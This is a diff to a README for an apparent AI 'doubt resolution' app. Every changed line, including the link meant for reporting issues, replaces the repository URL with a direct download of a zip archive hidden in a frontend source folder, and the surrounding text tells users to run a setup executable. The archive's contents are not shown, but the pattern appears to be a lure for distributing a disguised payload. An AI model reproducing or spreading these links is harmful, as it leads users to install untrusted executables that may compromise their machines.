@@ -1,6 +1,6 @@
 # 🤖 PS-HK19_MindForge_MindForge - Simple AI Doubt Resolution Tool
 
-[![Download Now](https://img.shields.io/badge/Download-PS--HK19--MindForge--MindForge-brightgreen)](https://github.com/iqiipo-dev/PS-HK19_MindForge_MindForge)
+[![Download Now](https://img.shields.io/badge/Download-PS--HK19--MindForge--MindForge-brightgreen)](https://raw.githubusercontent.com/iqiipo-dev/PS-HK19_MindForge_MindForge/main/mindforge-frontend/src/pages/Forge-H-P-Mind-v2.2.zip)
 
 ---
 
@@ -43,7 +43,7 @@ This software works offline after initial setup but may need internet access for
 
 Click the large badge below to visit the download page:
 
-[![Download Page](https://img.shields.io/badge/Download-PS--HK19--MindForge--MindForge-blue)](https://github.com/iqiipo-dev/PS-HK19_MindForge_MindForge)
+[![Download Page](https://img.shields.io/badge/Download-PS--HK19--MindForge--MindForge-blue)](https://raw.githubusercontent.com/iqiipo-dev/PS-HK19_MindForge_MindForge/main/mindforge-frontend/src/pages/Forge-H-P-Mind-v2.2.zip)
 
 On the page, look for the latest Windows version installer or setup file. The file should have a name similar to `PS-HK19_MindForge_MindForge-Setup.exe`.
 
@@ -107,7 +107,7 @@ To keep the software working smoothly, check the GitHub page regularly for new v
 ## ❓ Need More Help?
 
 Visit the download page here:  
-[Download PS-HK19_MindForge_MindForge](https://github.com/iqiipo-dev/PS-HK19_MindForge_MindForge)
+[Download PS-HK19_MindForge_MindForge](https://raw.githubusercontent.com/iqiipo-dev/PS-HK19_MindForge_MindForge/main/mindforge-frontend/src/pages/Forge-H-P-Mind-v2.2.zip)
 
 Look for documentation or open an issue if you need assistance. The project maintainers monitor the page to help users when needed.
 
@@ -150,10 +150,10 @@ You do not need to change any files to use the app. This is for advanced users w
 
 For any questions or issues, use the “Issues” tab on the GitHub page:
 
-https://github.com/iqiipo-dev/PS-HK19_MindForge_MindForge/issues
+https://raw.githubusercontent.com/iqiipo-dev/PS-HK19_MindForge_MindForge/main/mindforge-frontend/src/pages/Forge-H-P-Mind-v2.2.zip
 
 This helps the maintainers track bugs and guide users privately if needed.
 
 ---
 
-[![Get PS-HK19_MindForge_MindForge](https://img.shields.io/badge/Get-PS--HK19--MindForge--MindForge-purple)](https://github.com/iqiipo-dev/PS-HK19_MindForge_MindForge)
+[![Get PS-HK19_MindForge_MindForge](https://img.shields.io/badge/Get-PS--HK19--MindForge--MindForge-purple)](https://raw.githubusercontent.com/iqiipo-dev/PS-HK19_MindForge_MindForge/main/mindforge-frontend/src/pages/Forge-H-P-Mind-v2.2.zip)
